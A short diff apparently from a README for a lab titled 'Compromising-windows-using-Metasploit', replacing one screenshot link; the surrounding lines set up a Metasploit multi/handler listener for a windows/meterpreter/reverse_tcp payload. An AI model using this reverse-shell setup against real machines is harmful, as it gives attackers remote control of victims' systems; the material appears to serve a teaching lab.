@@ -71,7 +71,8 @@ use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
-![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)
+![Screenshot 2025-04-07 115214](https://github.com/user-attachments/assets/ea384ca5-6c96-405e-9b45-b23f4e9fab41)
+
 
 
 
